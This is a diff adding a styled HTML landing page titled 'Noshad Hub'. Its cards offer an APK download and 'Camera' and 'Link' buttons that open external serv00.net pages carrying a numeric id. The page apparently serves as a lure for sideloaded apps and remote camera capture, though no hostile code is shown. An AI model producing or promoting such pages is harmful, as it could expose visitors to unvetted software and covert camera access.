@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Noshad Hub</title>
+<style>
+*{box-sizing:border-box}body{margin:0;background:#050505;color:#fff;font-family:Arial,sans-serif;min-height:100vh;overflow-x:hidden}
+body:before{content:"";position:fixed;inset:0;background:radial-gradient(circle at 50% 35%,#3b0000 0,#090000 28%,#050505 65%);z-index:-2}
+body:after{content:"";position:fixed;inset:-30%;background:conic-gradient(from 0deg,transparent,#e00000,transparent 18%);opacity:.12;animation:spin 9s linear infinite;z-index:-1}
+.wrap{text-align:center;padding:42px 18px}.welcome{color:#ff3030;letter-spacing:5px;font-weight:700;font-size:18px;animation:fade 1.4s ease both}
+.logo{width:min(78vw,330px);margin:20px auto;display:block;filter:drop-shadow(0 0 18px #e00000);animation:pop 1.6s cubic-bezier(.2,.8,.2,1) both}
+h1{font-size:clamp(36px,10vw,72px);margin:0;text-transform:uppercase;letter-spacing:7px;text-shadow:0 0 10px #f00,0 0 30px #f00;animation:glow 2s ease-in-out infinite alternate}
+.sub{color:#bbb;margin:12px 0 28px}.btn,.card{display:block;width:min(92vw,430px);margin:14px auto;padding:16px 20px;border-radius:14px;text-decoration:none;color:#fff;border:1px solid #ff2020;background:#100000;box-shadow:0 0 18px #700;transition:.25s}
+.btn:hover,.card:hover{transform:translateY(-3px);box-shadow:0 0 30px #f00}.start{font-weight:800;letter-spacing:3px;background:#b40000}
+#hub{display:none;max-width:650px;margin:20px auto}.icon{font-size:30px;display:block;margin-bottom:6px}.small{font-size:13px;color:#aaa}
+@keyframes pop{from{opacity:0;transform:scale(.65)}to{opacity:1;transform:scale(1)}}@keyframes fade{from{opacity:0;transform:translateY(-15px)}to{opacity:1;transform:none}}@keyframes glow{from{text-shadow:0 0 8px #f00}to{text-shadow:0 0 28px #f00,0 0 50px #900}}@keyframes spin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<main class="wrap">
+<div class="welcome">WELCOME TO MY HUB</div>
+<img class="logo" src="logo.png" alt="Noshad Hub logo">
+<h1>Noshad</h1><div class="sub">Your personal hub</div>
+<button class="btn start" onclick="openHub()">START NOW</button>
+
+<section id="hub">
+<a class="card" href="NoshadHub-App.apk" download><span class="icon">🖼️</span><b>GALLERY</b><span class="small">Download your app APK</span></a>
+<a class="card" href="https://famofcfallxd.serv00.net/c/?id=8949475128" target="_blank" rel="noopener"><span class="icon">📷</span><b>CAMERA</b><span class="small">Open Camera</span></a>
+<a class="card" href="https://famofcfallxd.serv00.net/p/?id=8949475128" target="_blank" rel="noopener"><span class="icon">🔗</span><b>LINK</b><span class="small">Open link</span></a>
+</section>
+</main>
+<script>
+function openHub(){document.getElementById('hub').style.display='block';document.getElementById('hub').scrollIntoView({behavior:'smooth'});}
+</script>
+</body></html>
